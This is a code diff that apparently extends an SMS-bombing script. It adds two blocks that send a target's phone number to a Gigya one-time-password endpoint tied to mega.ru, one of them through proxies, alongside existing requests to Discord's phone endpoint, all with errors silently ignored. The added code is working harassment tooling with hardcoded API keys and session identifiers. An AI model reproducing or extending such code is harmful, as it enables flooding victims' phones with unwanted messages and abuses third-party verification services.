@@ -163,6 +163,43 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+=' '
+					num2+=num[7]
+					num2+=num[8]
+					num2+=num[9]
+					num2+=num[10]
+					payload = {
+						"phoneNumber": num2,
+						"lang": "ru",
+						"APIKey": "3_IEHUullBASM07basNap0ZX6mC1S7uU6oU67H1KWSl6oh2yKQMtMilq90YpDKwNYX",
+						"source": "showScreenSet",
+						"sdk": "js_latest",
+						"authMode": "cookie",
+						"pageURL": "https://mega.ru/",
+						"gmid": "gmid.ver4.AcbHH_44kg.W9objnQjjjNyWlnpb5dXZtuVcot1LEA4venSViSYt7cPRhfE-e3etDP09jiTXfJB.yoI8F_D6oMuQD1hMqxu43Dym7VO-KKFYlogFpTBPzfbZhiKSu2LYVBLeMTfjB9g8agpRWhZ4-puTXtS0ak9ZNw.sc3",
+						"ucid": "eGk3kDYny_ntiXq3ATdWwA",
+						"sdkBuild": 12563,
+						"format": "json"
+					}
+					requests.post("https://accounts.ru1.gigya.com/accounts.otp.sendCode", data=payload, proxies = proxies)
+				except:
+					pass
+
+				try:
 					payload = {
 						"change_phone_reason": "user_action_required",
 						"phone": f"+{number}"
@@ -437,6 +474,43 @@ def sms(prx, number, tm, code):
 						"phone": f"+{number}"
 					}
 					requests.post("https://discord.com/api/v9/users/@me/phone", json = payload)
+				except:
+					pass
+
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+=' '
+					num2+=num[7]
+					num2+=num[8]
+					num2+=num[9]
+					num2+=num[10]
+					payload = {
+						"phoneNumber": num2,
+						"lang": "ru",
+						"APIKey": "3_IEHUullBASM07basNap0ZX6mC1S7uU6oU67H1KWSl6oh2yKQMtMilq90YpDKwNYX",
+						"source": "showScreenSet",
+						"sdk": "js_latest",
+						"authMode": "cookie",
+						"pageURL": "https://mega.ru/",
+						"gmid": "gmid.ver4.AcbHH_44kg.W9objnQjjjNyWlnpb5dXZtuVcot1LEA4venSViSYt7cPRhfE-e3etDP09jiTXfJB.yoI8F_D6oMuQD1hMqxu43Dym7VO-KKFYlogFpTBPzfbZhiKSu2LYVBLeMTfjB9g8agpRWhZ4-puTXtS0ak9ZNw.sc3",
+						"ucid": "eGk3kDYny_ntiXq3ATdWwA",
+						"sdkBuild": 12563,
+						"format": "json"
+					}
+					requests.post("https://accounts.ru1.gigya.com/accounts.otp.sendCode", data=payload)
 				except:
 					pass
 
